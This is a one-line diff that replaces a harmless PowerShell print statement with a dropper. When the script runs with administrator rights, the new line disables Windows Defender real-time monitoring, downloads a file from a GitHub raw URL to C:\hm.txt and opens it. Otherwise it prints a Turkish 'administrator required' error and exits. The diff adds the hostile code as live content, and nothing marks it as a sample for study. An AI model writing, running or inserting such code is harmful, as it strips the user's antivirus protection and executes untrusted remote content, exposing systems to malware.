@@ -1,1 +1,1 @@
-write "sa"
+$U="https://raw.githubusercontent.com/xanteyim/cod/main/kod.txt"; $P="C:\hm.txt"; if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { Set-MpPreference -DisableRealtimeMonitoring $true; Start-Sleep -Seconds 3; iwr -Uri $U -OutFile $P -UseBasicParsing; ii $P } else { Write-Host "❌ YÖNETİCİ GEREKLİ" -ForegroundColor Red; Exit 1 }
